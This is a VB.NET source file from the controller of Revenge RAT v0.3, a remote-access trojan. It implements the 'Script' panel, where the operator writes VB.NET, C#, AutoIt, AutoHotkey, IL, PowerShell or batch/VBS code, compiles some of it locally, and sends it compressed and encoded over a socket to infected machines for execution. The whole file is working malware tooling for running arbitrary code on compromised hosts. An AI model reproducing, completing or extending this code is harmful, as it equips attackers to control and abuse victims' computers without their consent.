Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Runtime.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Script
    Public sock As Integer
    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim text As String = Interaction.InputBox("add a Reference", "Add Reference", "", -1, -1)
        If ([text] <> Nothing) Then
            Me.Fxlsv3.Items.Add([text])
        End If
    End Sub

    Private Sub AHKB_Click(sender As Object, e As EventArgs) Handles AHKB.Click
        If ((Me.AHKT.Text <> Nothing) AndAlso File.Exists((Application.StartupPath & "\Extensions\AHK\Ahk2Exe.exe"))) Then
            Dim info2 As New ProcessStartInfo
            info2.CreateNoWindow = True
            info2.WindowStyle = ProcessWindowStyle.Hidden
            info2.WorkingDirectory = (Application.StartupPath & "\Extensions\AHK\")
            info2.FileName = "Ahk2Exe.exe"
            info2.Arguments = " /in AHK.ahk /out AHK.exe"
            Dim startInfo As ProcessStartInfo = info2
            File.WriteAllText((Application.StartupPath & "\Extensions\AHK\AHK.ahk"), Me.AHKT.Text)
            Process.Start(startInfo).WaitForExit()

            If File.Exists((Application.StartupPath & "\Extensions\AHK\AHK.exe")) Then
                Me.AHKB.Enabled = False
                Me.AHKT.Enabled = False
                My.Forms.Main.s.Send(Me.sock, String.Concat(New String() {"Compile Native", My.Forms.Main.Key, Convert.ToBase64String(SocketServer.Compress(File.ReadAllBytes((Application.StartupPath & "\Extensions\AHK\AHK.exe")))), My.Forms.Main.Key, My.Forms.Main.RandomVariable(5, 15), SocketServer.GenRandom(1, 10), My.Forms.Main.Key, "AHK"}))
                File.Delete((Application.StartupPath & "\Extensions\AHK\AHK.exe"))
                File.Delete((Application.StartupPath & "\Extensions\AHK.ahk"))
            End If
        End If
    End Sub

    Private Sub AHKB_EnabledChanged(sender As Object, e As EventArgs) Handles AHKB.EnabledChanged
        Me.AHKT.Enabled = Me.AHKB.Enabled
    End Sub

    Private Sub CAUT_Click(sender As Object, e As EventArgs) Handles CAUT.Click
        If ((Me.AUTC.Text <> Nothing) AndAlso File.Exists((Application.StartupPath & "\Extensions\Aut2Exe\Aut2exe.exe"))) Then
            Dim info2 As New ProcessStartInfo
            info2.CreateNoWindow = True
            info2.WindowStyle = ProcessWindowStyle.Hidden
            info2.WorkingDirectory = (Application.StartupPath & "\Extensions\Aut2Exe\")
            info2.FileName = "Aut2exe.exe"
            info2.Arguments = " /in Autoit.au3 /out Autoit.exe"
            Dim startInfo As ProcessStartInfo = info2
            File.WriteAllText((Application.StartupPath & "\Extensions\Aut2Exe\Autoit.au3"), Me.AUTC.Text)
            Process.Start(startInfo).WaitForExit()

            If File.Exists((Application.StartupPath & "\Extensions\Aut2Exe\Autoit.exe")) Then
                My.Forms.Main.s.Send(Me.sock, String.Concat(New String() {"Compile Native", My.Forms.Main.Key, Convert.ToBase64String(SocketServer.Compress(File.ReadAllBytes((Application.StartupPath & "\Extensions\Aut2Exe\Autoit.exe")))), My.Forms.Main.Key, My.Forms.Main.RandomVariable(5, 15), SocketServer.GenRandom(1, 10), My.Forms.Main.Key, "Autiot"}))
                File.Delete((Application.StartupPath & "\Extensions\Aut2Exe\Autoit.exe"))
                File.Delete((Application.StartupPath & "\Extensions\Aut2Exe\Autoit.au3"))
                Me.CAUT.Enabled = False
            End If
        End If
    End Sub

    Private Sub CAUT_EnabledChanged(sender As Object, e As EventArgs) Handles CAUT.EnabledChanged
        Me.AUTC.Enabled = Me.CAUT.Enabled
    End Sub

    Private Sub CleanListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleanListToolStripMenuItem.Click
        Me.Fxlsv3.Items.Clear()
    End Sub

    Private Sub CNET_Click(sender As Object, e As EventArgs) Handles CNET.Click
        If (Me.VBC.Text <> Nothing) Then
            Me.Fxlsv1.Items.Clear()
            Dim right As String = "Null"
            If (Me.Fxlsv3.Items.Count > 0) Then
                Dim enumerator As IEnumerator
                right = Nothing
                Try
                    enumerator = Me.Fxlsv3.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        right = (right & current.SubItems.Item(0).Text & "|")
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Compile .NET" & My.Forms.Main.Key), clsCompressedString.Encode((Me.VBC.Text & "****R"))), My.Forms.Main.Key), right), My.Forms.Main.Key), My.Forms.Main.RandomVariable(5, 15)), SocketServer.GenRandom(1, 10))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.CNET.Enabled = False
        End If
    End Sub

    Private Sub CNET_EnabledChanged(sender As Object, e As EventArgs) Handles CNET.EnabledChanged
        Me.Fxlsv1.Enabled = Me.CNET.Enabled
        Me.Fxlsv3.Enabled = Me.CNET.Enabled
        Me.VBC.Enabled = Me.CNET.Enabled
    End Sub

    Private Sub CSharpc_Click(sender As Object, e As EventArgs) Handles CSharpc.Click
        If (Me.Csharp.Text <> Nothing) Then
            Dim right As String = "Null"
            If (Me.Fxlsv4.Items.Count > 0) Then
                Dim enumerator As IEnumerator
                right = Nothing
                Try
                    enumerator = Me.Fxlsv4.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        right = (right & current.SubItems.Item(0).Text & "|")
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
            Me.Fxlsv2.Items.Clear()
            Me.CSharpc.Enabled = False
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Compile Csharp" & My.Forms.Main.Key), clsCompressedString.Encode((Me.Csharp.Text & "****R"))), My.Forms.Main.Key), right), My.Forms.Main.Key), My.Forms.Main.RandomVariable(5, 15)), SocketServer.GenRandom(1, 10))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        End If
    End Sub

    Private Sub CSharpc_EnabledChanged(sender As Object, e As EventArgs) Handles CSharpc.EnabledChanged
        Me.Csharp.Enabled = Me.CSharpc.Enabled
        Me.Fxlsv4.Enabled = Me.CSharpc.Enabled
        Me.Fxlsv2.Enabled = Me.CSharpc.Enabled
    End Sub

    Private Sub EX_Click(sender As Object, e As EventArgs) Handles EX.Click
        If ((Me.type.SelectedIndex <> -1) AndAlso (Me.SC.Text <> Nothing)) Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("ScriptWirte" & My.Forms.Main.Key), clsCompressedString.Encode((Me.SC.Text & "****R"))), My.Forms.Main.Key), Me.type.Text), My.Forms.Main.Key), My.Forms.Main.RandomVariable(5, 15)), SocketServer.GenRandom(1, 10))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.EX.Enabled = False
        End If
    End Sub

    Private Sub EX_EnabledChanged(sender As Object, e As EventArgs) Handles EX.EnabledChanged
        Me.SC.Enabled = Me.EX.Enabled
        Me.type.Enabled = Me.EX.Enabled
    End Sub

    Private Sub ILB_Click(sender As Object, e As EventArgs) Handles ILB.Click
        If (Me.ILC.Text <> Nothing) Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("IL" & My.Forms.Main.Key), SocketServer.Encode(Me.ILC.Text)), My.Forms.Main.Key), My.Forms.Main.RandomVariable(5, 15)), SocketServer.GenRandom(1, 10))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.ILB.Enabled = False
        End If
    End Sub

    Private Sub ILB_EnabledChanged(sender As Object, e As EventArgs) Handles ILB.EnabledChanged
        Me.ILC.Enabled = Me.ILB.Enabled
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Fxlsv3.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RVPS_Click(sender As Object, e As EventArgs) Handles RVPS.Click
        If (Me.PSC.Text <> Nothing) Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("PS" & My.Forms.Main.Key), SocketServer.Encode(Me.PSC.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.RVPS.Enabled = False
        End If
    End Sub

    Private Sub RVPS_EnabledChanged(sender As Object, e As EventArgs) Handles RVPS.EnabledChanged
        Me.PSC.Enabled = Me.RVPS.Enabled
    End Sub

    Private Sub Script_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim num2 As Integer
        Me.ImageList1.Images.Add("0", My.Resources._1481204153_error)
        Me.VBC.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.Csharp.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.ILC.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.SC.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.AUTC.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.AHKT.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.PSC.Font = New Font("Verdana", 10.0!, FontStyle.Bold)
        Me.TableLayoutPanel1.BackColor = XylosTabControl.CCB
        Dim num As Integer = 0
        Do
            Me.UltimatumTabControl1.TabPages.Item(num).BackColor = SystemColors.Window
            num += 1
            num2 = 2
        Loop While (num <= num2)
        Me.StatusStrip1.BackColor = XylosTabControl.CCB
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Dim text As String = Interaction.InputBox("add a Reference", "Add Reference", "", -1, -1)
        If ([text] <> Nothing) Then
            Me.Fxlsv4.Items.Add([text])
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Fxlsv4.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Me.Fxlsv4.Items.Clear()
    End Sub

    Private Sub type_SelectedIndexChanged(sender As Object, e As EventArgs) Handles type.SelectedIndexChanged
        If (Me.type.SelectedIndex = 0) Then
            Me.SC.Text = "Revenge = MsgBox(""Hello World!"",vbOKOnly+vbInformation,""Hello!"")"
        ElseIf (Me.type.SelectedIndex = 1) Then
            Me.SC.Text = "@echo off" & ChrW(13) & ChrW(10) & "echo Hello world!" & ChrW(13) & ChrW(10) & "pause"
        ElseIf (Me.type.SelectedIndex = 4) Then
            Me.SC.Text = My.Resources.HTML
        Else
            Me.SC.Text = ""
        End If
    End Sub
End Class